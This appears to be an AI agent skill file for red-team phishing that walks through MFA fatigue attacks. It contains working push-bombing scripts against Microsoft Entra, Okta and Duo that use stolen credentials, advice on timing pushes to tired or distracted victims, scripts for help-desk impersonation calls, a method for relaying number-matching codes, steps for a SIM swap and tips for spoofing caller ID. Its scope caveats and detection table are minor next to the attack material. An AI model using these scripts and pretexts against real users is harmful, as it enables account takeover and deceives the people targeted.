---
name: mfa-fatigue-social
description: "MFA fatigue (push-bombing) combined with help-desk impersonation — overwhelm the target with repeated MFA push notifications and then social-engineer them into approving via a vishing call posing as IT support."
allowed-tools: Bash Read Write
metadata:
  subdomain: phishing
  when_to_use: "mfa fatigue push bombing push notification help desk impersonation vishing social engineering sim swap valid accounts mfa bypass t1621"
  mitre_attack:
    - T1621
    - T1078
    - T1566.004
  tags:
    - phishing
    - mfa-fatigue
    - push-bombing
    - vishing
    - social-engineering
---

# MFA Fatigue / Push-Bombing + Help-Desk Social Engineering

When you already hold valid credentials (from a prior credential-harvest
phase, a breach dump, or password spray) but MFA blocks login, MFA
fatigue is the bypass. Flood the target with push notifications — at
3 AM, during meetings, repeatedly — until they approve one to make it
stop. Combine with a help-desk impersonation vishing call for a
near-guaranteed approval.

This is how Lapsus$ breached Uber and Cisco in 2022.

## Prerequisites

- Valid `username:password` for the target user (from credential harvest,
  password spray, or breach data).
- Knowledge of the target's MFA type (Microsoft Authenticator push,
  Duo push, Okta Verify, etc.).
- A burner phone or VoIP line for vishing (`T1566.004`).
- The `lure-deconfliction` handshake COMPLETE.

## Quick Reference

```bash
# Trigger MFA push via OAuth — Microsoft Entra example
curl -s -X POST "https://login.microsoftonline.com/<TENANT_ID>/oauth2/v2.0/token" \
  -d "client_id=<APP_ID>&scope=https://graph.microsoft.com/.default" \
  -d "grant_type=password&username=<USER>&password=<PASS>"

# Automated push loop (controlled cadence)
for i in $(seq 1 <COUNT>); do
  curl -s -X POST "https://login.microsoftonline.com/<TENANT_ID>/oauth2/v2.0/token" \
    -d "client_id=<APP_ID>&scope=https://graph.microsoft.com/.default" \
    -d "grant_type=password&username=<USER>&password=<PASS>" \
    -o /dev/null
  sleep <INTERVAL_SECONDS>
done
```

## MITRE ATT&CK Mapping

| Technique | ID | Usage |
|---|---|---|
| Multi-Factor Authentication Request Generation | T1621 | Repeated push notifications to fatigue the user |
| Valid Accounts | T1078 | Compromised credentials used to trigger MFA |
| Phishing: Spearphishing Voice | T1566.004 | Vishing call posing as IT help desk |

## 1. MFA Push-Bombing Automation

### 1a. Microsoft Entra ID (Azure AD)

Trigger push notifications by attempting ROPC (Resource Owner Password
Credential) grant. Each attempt generates a push to the registered
authenticator app:

```python
import requests
import time

TENANT = "<TENANT_ID>"
CLIENT_ID = "1b730954-1685-4b74-9bfd-dac224a7b894"  # Azure AD PowerShell
TOKEN_URL = f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token"

USERNAME = "<TARGET_EMAIL>"
PASSWORD = "<TARGET_PASSWORD>"

def trigger_push():
    resp = requests.post(TOKEN_URL, data={
        "client_id": CLIENT_ID,
        "scope": "https://graph.microsoft.com/.default",
        "grant_type": "password",
        "username": USERNAME,
        "password": PASSWORD,
    })
    return resp.json()

# Controlled cadence — too fast triggers rate-limiting / lockout
PUSHES = 10
INTERVAL = 60  # seconds between pushes

for i in range(PUSHES):
    result = trigger_push()
    if "access_token" in result:
        print(f"[+] Push #{i+1} APPROVED — token obtained!")
        with open("/workspace/evidence/mfa_token.json", "w") as f:
            import json; json.dump(result, f)
        break
    elif "AADSTS50076" in result.get("error_description", ""):
        print(f"[*] Push #{i+1} sent, awaiting approval...")
    elif "AADSTS50053" in result.get("error_description", ""):
        print("[!] Account locked out — abort")
        break
    else:
        print(f"[-] Push #{i+1}: {result.get('error_description','unknown')}")
    time.sleep(INTERVAL)
```

### 1b. Okta

Trigger via Okta's authn API — primary auth succeeds, then the MFA
challenge state triggers a push:

```python
import requests

OKTA_DOMAIN = "<TARGET>.okta.com"
AUTH_URL = f"https://{OKTA_DOMAIN}/api/v1/authn"

# Step 1: Primary auth
resp = requests.post(AUTH_URL, json={
    "username": "<TARGET_EMAIL>",
    "password": "<TARGET_PASSWORD>",
})
state_token = resp.json().get("stateToken")
factor_id = None
for factor in resp.json().get("_embedded", {}).get("factors", []):
    if factor["factorType"] == "push":
        factor_id = factor["id"]
        break

# Step 2: Trigger push
if factor_id and state_token:
    verify_url = f"https://{OKTA_DOMAIN}/api/v1/authn/factors/{factor_id}/verify"
    resp = requests.post(verify_url, json={"stateToken": state_token})
    print(f"Push status: {resp.json().get('status')}")
```

### 1c. Duo

Trigger via Duo's Auth API (requires ikey/skey from a compromised Duo
admin panel or config file):

```bash
# Duo push via Auth API
curl -s -X POST "https://api-<DUO_HOST>.duosecurity.com/auth/v2/auth" \
  -d "username=<TARGET_USER>&factor=push&device=auto" \
  -u "<INTEGRATION_KEY>:<SECRET_KEY>"
```

## 2. Timing Strategy

Push fatigue is most effective when the victim is distracted or tired:

| Timing | Rationale |
|---|---|
| 1-3 AM local time | Victim wakes to notifications, taps approve to dismiss |
| During known meetings | Victim approves to stop phone buzzing in meeting |
| Just before lunch / end of day | Cognitive fatigue, reduced vigilance |
| After 5+ pushes over 15 min | Annoyance threshold — "just make it stop" |

**Cadence**: 1 push per 45-90 seconds avoids rate-limiting on most IdPs.
Do NOT exceed 3 pushes per minute — Microsoft / Okta will lock the
account or trigger "number matching" enforcement.

## 3. Help-Desk Impersonation (Vishing)

Combine push-bombing with a vishing call for highest success rate.
The social engineering call should happen concurrently with the pushes:

### Call Script

```
"Hi <FIRST_NAME>, this is <FAKE_NAME> from IT Security at <TARGET_ORG>.
We're seeing some unusual activity on your account and need to verify
your identity. You should be receiving a notification on your phone
right now — could you go ahead and approve that for me so I can
confirm it's you? This is part of our standard security verification
process."
```

### Script Variants

**Urgent variant** (creates pressure):
```
"We've detected a potential compromise on your account. I need you to
approve the security prompt on your phone immediately so we can secure
your account before the attacker gets in."
```

**Routine variant** (normalises the request):
```
"We're rolling out a mandatory security update. Everyone in your
department needs to re-verify. Just approve the prompt that's coming
to your phone and you're all set."
```

### Caller ID Spoofing

Spoof the organisation's IT help-desk phone number to build trust:

```bash
# Via SIP trunk with spoofed caller ID (requires SIP provider)
# Configure the FROM header in your SIP client:
# From: "IT Help Desk" <sip:<HELPDESK_NUMBER>@<SIP_PROVIDER>>
```

## 4. Number-Matching Bypass

Microsoft and Okta now enforce number matching — the push displays a
two-digit number that the user must enter. This defeats blind push
approval but not vishing:

```
"You should see a number on your login screen. Can you read that
number to me so I can verify it matches on our end?"

[Victim reads the number]

"Perfect, that matches. Now go ahead and enter that number in your
authenticator app."
```

The attacker sees the number on the authentication page and relays it
to the victim via the phone call in real time.

## 5. SIM-Swap Coordination (SMS MFA Bypass)

When the target uses SMS-based MFA, a SIM swap redirects SMS to an
attacker-controlled SIM:

1. **OSINT**: gather target's phone number, carrier, last 4 of SSN,
   billing address from prior recon.
2. **Call carrier support**: impersonate the target, request SIM swap
   to a new SIM citing "lost phone."
3. **Receive SMS OTP**: once the swap completes (minutes to hours),
   SMS codes arrive on the attacker's device.
4. **Login with OTP**: complete the MFA challenge with the intercepted
   code.

**Note**: SIM swaps are increasingly detected by carriers (T-Mobile
Account Takeover Protection, AT&T Extra Security). Port-out PINs block
this path — verify the carrier's protections first.

## OPSEC

- **Burner infrastructure**: use a VoIP number (Twilio, Google Voice)
  that cannot be traced back. Dispose after the engagement.
- **Caller ID spoofing legality**: carrier-level spoofing may violate
  local telecom regulations — confirm engagement scope covers vishing.
- **Rate limiting**: if the IdP locks the account after N failed MFA
  attempts, abort and switch to another target. Do NOT brute-force.
- **Logging**: every ROPC attempt generates an Azure AD sign-in log
  entry. Expect the SOC to see these.
- **Number matching**: if the IdP enforces number matching, vishing is
  required — blind push-bombing alone will not work.

## Tools & Resources

| Tool | Purpose |
|---|---|
| `requests` (Python) | HTTP-based MFA push triggering |
| `curl` | Quick push trigger from shell |
| Twilio / VoIP | Burner phone line for vishing calls |
| SpoofCard / SIP trunk | Caller ID spoofing |
| GoPhish | Email pretext delivery before vishing |
| Evilginx2 | Fallback: AiTM if push-bombing fails |

## Detection Signatures

| Detection | Source | Description |
|---|---|---|
| Rapid MFA push denials | IdP logs (Azure AD / Okta) | Multiple `MFA denied` events in short window |
| ROPC grant attempts | Azure AD sign-in logs | `ResourceOwnerPasswordCredential` grant type |
| Account lockout after MFA failures | IdP alerts | Lockout policy triggered by repeated MFA |
| Caller ID mismatch | Telecom logs | Spoofed number not matching carrier records |
| SIM swap event | Carrier API / account alerts | IMSI change on the target's number |

## Error Handling & Edge Cases

- **Account lockout**: if the IdP locks the account after N attempts,
  the password is burned. Switch to a different target or wait for
  lockout expiry. Do NOT reset the password.
- **Number matching enforced globally**: blind push-bombing is useless.
  Fall back to vishing + number relay or switch to evilginx2 AiTM.
- **Phishing-resistant MFA (FIDO2/passkeys)**: push-bombing and vishing
  are both ineffective against hardware keys. Pivot to a different
  initial-access vector (HTML smuggling, browser-in-the-browser).
- **Duo "Fraud" button**: if the victim taps "Fraud" in Duo, the
  account is locked and the SOC is alerted. Abort immediately.
- **VoIP number flagged as spam**: rotate to a fresh number or use a
  different carrier.

## Decision Gate

```
IF target uses phishing-resistant MFA (FIDO2 / WebAuthn / passkeys)
  → MFA fatigue is NOT viable
  → pivot to evilginx2-proxy (AiTM) or html-smuggling-lure
ELIF target uses push-based MFA with number matching
  → MFA fatigue requires concurrent vishing (§3 + §4)
  → prepare number-relay call script
ELIF target uses push-based MFA without number matching
  → standard push-bombing (§1) at optimal timing (§2)
  → add vishing for higher success probability
ELIF target uses SMS-based MFA
  → evaluate SIM-swap viability (§5)
  → OR use evilginx2-proxy to capture OTP in real time
ELSE
  → standard push-bombing with vishing fallback
```

## Evidence

Successful MFA bypass → record the method (`push-approved`,
`number-relay`, `sim-swap`) as an edge attribute on the `Credential` →
`Session` kill-chain. Save the token or session cookie under
`evidence/phisher/<user>-mfa-bypass.json`. Log the vishing call
timestamp and duration for the engagement report.
